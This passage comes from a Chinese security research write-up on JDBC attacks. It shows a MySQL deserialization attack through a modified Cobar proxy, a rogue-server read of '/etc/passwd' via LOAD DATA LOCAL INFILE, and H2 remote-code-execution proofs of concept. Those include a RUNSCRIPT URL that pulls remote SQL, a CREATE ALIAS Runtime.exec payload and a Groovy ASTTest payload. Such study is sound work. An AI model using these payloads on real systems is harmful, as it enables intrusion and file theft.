师傅应该就是这样实现的） \- 通过修改后的 mysql 插件来实现相应的功能。（codeplutos 师傅的实现方式）
但这些方法对我来说都太复杂了，所以我尝试使用了更简单更优雅的方式创建了自己的恶意服务器，使用了所谓的：”数据库中间件“。
我找到了一个 alibaba 的开源项目 [cobar](https://github.com/alibaba/cobar)，
它是一个分片数据库的代理，不过你管它叫什么都行，实际上它就是一个客户端和服务端的中间的代理。
在使用 cobar 等数据库中间件时，对于真正的客户端，cobar 扮演 Mysql 服务器的角色；对于真正的服务器，cobar
是其客户端。因此，它是我们控制特定语句执行结果的完美工具。
Talk is cheap.让我们在实际环境中演示真正的攻击过程： \- Real Mysql Server: 5.6.35 \- cobar: 4.0.0
\- mysql-connector-java: 5.1.29 \- 客户端依赖: commons-collections-3.2.1 \- 攻击方式:
detectCustomCollations
## 准备恶意序列化数据
首先，生成恶意序列化 payload，在我的演示环境里使用了 CC1 的利用链，并且最终调用 `Runtime.exec()` 执行系统命令 "open
-a Calculator.app" 弹出计算器，图中是我学习 ysoserial
中使用的[工具](https://github.com/su18/ysoserial)，你可以使用任何工具生成任何利用链。
然后，在真实的 Mysql 服务器创建一个储存恶意序列化数据的表，表中至少有 3 个字段，并且第三个字段的数据类型是 blob。
因为对于 detectCustomCollations 攻击方式来说，触发的第三个字段结果的对象反序列化，所以要在指定位置准备恶意 payload。
最后，我们使用如下代码将恶意序列化的数据插入表中:
    public static void main(String[] args) throws Exception {
        String CLASS_NAME = "com.mysql.jdbc.Driver";
        String URL        = "jdbc:mysql://localhost:3306/test";
        String USERNAME   = "root";
        String PASSWORD   = "123456";
        Class.forName(CLASS_NAME);
        Connection connection = DriverManager.getConnection(URL, USERNAME, PASSWORD);
        File file   = new File("/Users/phoebe/IdeaProjects/ysoserial-su18/CC1WithTransformedMap.bin");
        int  length = (int) file.length();
        FileInputStream stream = new FileInputStream(file);
        PreparedStatement statement = connection.prepareStatement("INSERT INTO evil (`a`,`b`,`c`) VALUES (1,1,?)");
        statement.setBlob(1, stream, length);
        statement.execute();
        statement.close();
        connection.close();
    }
## 配置代理层 Mysql 服务器
准备好存放恶意类的数据库后，就要配置数据库中间件，也就是 cobar，根据其配置文件规则，让其连接到 Mysql Server:
接下来配置 cobar 提供服务的一些参数，等待客户端的连接。
启动 cobar 后，他就变成了客户端到真实服务器的一个代理，无论再客户端执行了什么 sql 语句，cobar 都会先读取并解析，然后由 cobar
再去服务端执行查询获取结果。
我们已经知道，如果我们在 jdbc 连接参数中设置了 `detectCustomCollations=true` ， jdbc connector 会执行
`SHOW COLLATION` 语句，并尝试对返回字段的第三个字段进行反序列化。
在使用了 cobar 后，我们可以在中间层面替换执行的 sql 语句，仅仅需要如下两行简单的代码:
将这两行代码加入 `com.alibaba.cobar.server.ServerConnection#execute` 方法中，当 cobar 获取
`SHOW COLLATION` 语句后，就会向真实的服务器中执行 `select * from evil`，服务器会返回我们事先准备好的恶意字节码。
## 建立连接
使用 cobar 来建立连接。
    public static void main(String[] args) throws Exception {
        String CLASS_NAME = "com.mysql.jdbc.Driver";
        String URL        = "jdbc:mysql://localhost:8066/dbtest?detectCustomCollations=true&autoDeserialize=true";
        String USERNAME   = "root";
        String PASSWORD   = "123456";
        Class.forName(CLASS_NAME);
        Connection connection = DriverManager.getConnection(URL, USERNAME, PASSWORD);
        connection.close();
    }
成功弹出计算器。
# Cheat Sheet
下面是 fnmsd 师傅文章中的两个截图，可以用来做 Cheat Sheet。
## ServerStatusDiffInterceptor
## detectCustomCollations
# Arbitrary File Reading Vulnerability
除了操控 JDBC URI 导致反序列化漏洞之外, 在很久之前还披露了一种能够导致任意文件读取的 JDBC 攻击手段。
如果 mysql 客户端在连接服务端时使用了 `–enable-local-infile` 选项，并执行 `LOAD DATA LOCAL INFILE
'/etc/passwd' INTO TABLE test FIELDS TERMINATED BY '\n';`
语句，客户端会读取本地的文件并将其内容发送至服务端。
因此，如果 mysql 服务器是不受信任的服务器，一个简单的建立连接行为可能会导致对客户端的任意文件读取。更多的细节可以查看 LoRexxar 师傅的相关
[博客](https://lorexxar.cn/2020/01/14/css-mysql-chain) 以及 Github 上的
[恶意服务器项目](https://github.com/Gifts/Rogue-MySql-Server)。
Jdbc connector 中的 Sink 点位于 `com.mysql.jdbc.MysqlIO#sendFileToServer`。
# Make JDBC Attacks Brilliant Again
本篇议题由 Litch1 和 pyn3rd 在 HITB SECCONF SIN-2021 上分享。演讲 PPT
在[这里](https://conference.hitb.org/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&%20Chen%20Hongkun.pdf)
，议题视频在[这里](https://www.youtube.com/watch?v=MJWI8YXH1lg&ab_channel=HackInTheBoxSecurityConference)。线上讲解的是
Litch1 师傅。接下来跟着大佬的分享一起学习学习。
首先，他介绍了一下背景，并回顾了使用 ServerStatusDiffInterceptor 在不同版本中利用的的情况。
随后他列举了使用 jdbc 攻击技术的常见场景： \- 新反序列化链（如 fastjson/jackson，getter/setter
方法中包括初始化数据库链接的逻辑） \- 攻击 SpringBoot Actuator \- API 接口暴露 \- 钓鱼，蜜罐
然后他给出了一些典型的 jdbc 攻击案例。
## CSRF to JDBC Attack(Weblogic)
Weblogic (CVE-2020-2934), 由于 Weblogic 在创建 JDBCDataSourceForm 的接口中没有 CSRF
检测，攻击者可以使用 csrf 攻击结合 jdbc attack 技术组合为 RCE。
根据 PPT 中的截图，我跳过了 csrf 的部分复现了攻击。
## Reconfigure JDBC Resource(Wildfy)
JBOSS/Wildfy，在后台或各种中间件的内容管理系统中也有 jdbc 数据源的相关配置功能。例如 JBoss/Wildfy，因为 h2 数据库的
Driver 是内置的，攻击者可以在后台重新配置 jdbc 并实现攻击。
## H2 RCE
H2 的攻击使用了 Spring Boot H2 console 的特性，通过更改 h2 数据库的连接 url，攻击者可以迫使 spring boot
从远程运行 SQL 脚本。
    jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8000/poc.sql'
脚本如下，创建了一个调用 `Runtime.getRuntime().exec()`的函数并执行弹出计算器命令。
    CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return "su18";}';CALL EXEC ('open -a Calculator.app')
需要如下参数:
    spring.h2.console.enable=true
    spring.h2.console.setting.web-allow-others=true
复现截图如下：
攻击是如何执行的呢？
### INIT RUNSCRIPT
Sink 点在 `org.h2.engine.Engine#openSession`，h2 引擎在参数中拆分 ”INIT“ 参数并使用
CommandInterface 的不同实现类来根据配置初始化数据库连接。
在本案例下，具体的处理类是 `org.h2.command.CommandContainer`。
当使用 RUNSCRIPT 命令时， h2 数据库最终会调用 `org.h2.command.dml.RunScriptCommand#execute`
执行恶意 SQL 语句。
在这里为什么要使用 ”RUNSCRIPT“命令呢？
因为我们使用的 POC 需要执行两条 SQL 语句，第一条是 CREATE ALIAS 定义方法，第二条是 EXEC 执行。然而
`session.prepareCommand` 不支持多条 SQL 语句的执行。因此我们需要使用 RUNSCRIPT 命令从远端服务器加载 sql 语句。
但这也意味着攻击需要网络连接，如何绕过网络的限制？由于 h2 是一个嵌入式数据库，因此有可能发现不需要任何外部连接的攻击。
### Source Code Compiler
因此，我们应该找到一种方法，将 POC sql 简化为一条语句，这样就省去了交互，不用连接远程数据库。
Litch1 翻了 `CREATE ALIAS` 实现的源代码，发现在 SQL 语句中对于 JAVA
方法的定义被交给了源代码编译器。有三种支持的编译器：Java/Javascript/Groovy。
首先来看一下 Groovy。
在 `org.h2.util.SourceCompiler#getClass` 方法， h2 使用 `isGroovySource` 来判断是不是
Groovy 源代码。
如果是，则调用 `GroovyCompiler.parseClass()` 来解析 groovy 代码。这与 Orange 在 [Hacking
Jenkins Part 2](https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/) 议题中分析的 Sink 点是一致的.
由此 Litch1 给出了使用 `@groovy.transform.ASTTEST` 在 AST 中使用 assert 执行命令的 POC。
    public static void main (String[] args) throws ClassNotFoundException, SQLException {
        String groovy = "@groovy.transform.ASTTest(value={" + " assert java.lang.Runtime.getRuntime().exec(\"open -a Calculator\")" + "})" + "def x";
        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '"+ groovy +"'";
        Connection conn = DriverManager.getConnection(url);
        conn.close();